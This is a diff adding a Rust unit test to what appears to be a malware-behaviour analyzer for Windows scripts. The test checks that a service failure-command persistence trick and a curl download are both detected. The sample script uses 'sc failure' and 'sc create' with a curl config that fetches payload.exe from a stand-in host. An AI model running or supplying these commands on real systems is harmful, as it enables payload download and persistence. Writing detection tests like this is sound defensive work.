@@ -7969,6 +7969,36 @@ sc create UpdateSvc binPath= "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
             report.traits
         );
     }
+
+    #[test]
+    fn sc_failure_command_child_is_analyzed() {
+        let script = br#"echo url = "https://sc-failure.example/payload.exe" > curl.cfg
+sc failure UpdateSvc command= "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, value_name, command }
+                    if hive == "ServiceFailureCommand"
+                        && key == "UpdateSvc"
+                        && value_name == "command"
+                        && command.contains("cmd.exe /c curl -K curl.cfg")
+            )),
+            "service failure command persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://sc-failure.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "service failure command child was not analyzed: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
